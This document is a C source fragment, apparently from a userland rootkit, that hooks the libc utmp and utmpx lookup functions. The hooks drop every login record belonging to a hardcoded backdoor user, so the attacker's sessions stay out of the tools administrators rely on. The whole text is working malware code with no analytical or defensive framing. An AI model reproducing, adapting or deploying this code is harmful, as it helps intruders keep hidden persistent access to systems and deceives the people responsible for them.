struct utmp *getutid(const struct utmp *ut){
	struct utmp *tmp;
	hook(CGETUTID);
	do{
		tmp = call(CGETUTID, ut);
		if(is_bdusr())
			return tmp;
		if(tmp == NULL)
			continue;
	} while(tmp && !xstrncmp(tmp->ut_user, BD_UNAME));
	return tmp;
}

struct utmpx *getutxid(const struct utmpx *utx){
	struct utmpx *tmp;
	hook(CGETUTXID);
	do{
		tmp = call(CGETUTXID, utx);
		if(tmp == NULL)
			continue;
	} while(tmp && !xstrncmp(tmp->ut_user, BD_UNAME));
	return tmp;
}

struct utmp *getutline(const struct utmp *ut){
	struct utmp *tmp;
	hook(CGETUTLINE);
	do{
		tmp = call(CGETUTLINE, ut);
		if(tmp == NULL)
			continue;
	} while(tmp && !xstrncmp(tmp->ut_user, BD_UNAME));
	return tmp;
}

struct utmpx *getutxline(const struct utmpx *utx){
	struct utmpx *tmp;
	hook(CGETUTXLINE);
	do {
		tmp = call(CGETUTXLINE, utx);
		if(tmp == NULL)
			continue;
	} while(tmp && !xstrncmp(tmp->ut_user, BD_UNAME));
	return tmp;
}

struct utmp *getutent(void){
	struct utmp *tmp;
	hook(CGETUTENT);
	do{
		tmp = call(CGETUTENT);
		if(tmp == NULL)
			continue;
	} while(tmp && !xstrncmp(tmp->ut_user, BD_UNAME));
	return tmp;
}

struct utmpx *getutxent(void){
	struct utmpx *tmp;
	hook(CGETUTXENT);
	do{
		tmp = call(CGETUTXENT);
		if(tmp == NULL)
			continue;
	} while(tmp && !xstrncmp(tmp->ut_user, BD_UNAME));
	return tmp;
}

void getutmp(const struct utmpx *ux, struct utmp *u){
	if(hide_me)
		return;
	if(ux && ux->ut_user != NULL)
		if(!xstrncmp(ux->ut_user, BD_UNAME))
			hide_me = 1;
	hook(CGETUTMP);
	call(CGETUTMP, ux, u);
}

void getutmpx(const struct utmp *u, struct utmpx *ux){
	if(hide_me)
		return;
	if(u && u->ut_user != NULL)
		if(!xstrncmp(u->ut_user, BD_UNAME))
			hide_me = 1;
	hook(CGETUTMPX);
	call(CGETUTMPX, u, ux);
}
